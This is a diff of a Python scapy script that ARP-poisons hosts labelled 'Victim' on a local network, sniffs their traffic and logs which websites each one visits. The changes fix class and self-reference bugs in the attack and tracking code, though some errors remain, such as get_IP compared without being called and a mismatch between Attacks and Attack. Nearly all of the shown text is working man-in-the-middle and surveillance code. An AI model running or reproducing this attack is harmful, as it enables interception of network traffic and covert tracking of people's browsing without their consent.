@@ -10,19 +10,18 @@ class Victim():
 		self.websites = []
 		
 	def get_IP(self):
-		return IP
+		return self.IP
 		
 	def visit_website(self, domain):
-		n = len(websites)
+		n = len(self.websites)
 		for i in range(0, n):
-			website = websites[i]
+			website = self.websites[i]
 			if website.get_domain() == domain:
 				website.visit()
-				return
-			
-			websites.append(Webiste(domain))
+				return	
+		self.websites.append(Website(domain))
 
-class Webiste():
+class Website():
 	def __init__(self, domain):
 		self.domain = domain
 		self.visits = 1
@@ -76,8 +75,9 @@ class Attack(object):
 			arp2[ARP].pdst = self.targets[i].IP
 			sendp(arp2, iface = self.interface)
 			
-def track_traffic(targets):
-	
+class track_traffic():
+	def __init__(self, targets):
+		self.targets=targets
 	def track_packet(self, packet):
 		import socket
 		
@@ -85,11 +85,11 @@ def track_traffic(targets):
 		dest   = packet.dst
 		
 		for i in range (0, len(targets)):
-			if targets[i].get_IP == src:
-				targets[i].visit(socket.gethostbyaddr(dest))
+			if self.targets[i].get_IP == src:
+				self.targets[i].visit(socket.gethostbyaddr(dest))
 				return
-			if targets[i].get_IP == dest:
-				targets[i].visit(socket.gethostbyaddr(src))
+			if self.targets[i].get_IP == dest:
+				self.targets[i].visit(socket.gethostbyaddr(src))
 				return
 	
 	return track_packet
@@ -116,7 +116,7 @@ if __name__ == '__main__':
 			try:
 				Attacks(IP_router.src, targets, interface).send_Poison(my_Mac_Addr)
 				#sleep(3)
-				sniff(filter="ip", prn=track_traffic(targets), count=10)
+				sniff(filter="ip", prn=track_traffic(targets).track_packet, count=10)
 			except Exception:
 				print("[Failed to send ARP-Poison]")
 	except KeyboardInterrupt:
